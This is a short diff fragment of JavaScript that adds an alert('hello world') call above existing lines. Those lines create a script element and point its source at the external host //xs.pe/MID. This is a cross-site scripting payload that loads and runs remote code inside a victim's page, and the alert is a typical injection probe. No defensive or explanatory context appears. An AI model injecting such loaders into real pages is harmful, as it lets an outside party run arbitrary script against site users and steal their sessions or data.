@@ -1,3 +1,4 @@
+alert("hello world");
 s7=createElement('script');
 body.appendChild(s7);
 s7.src='//xs.pe/MID';
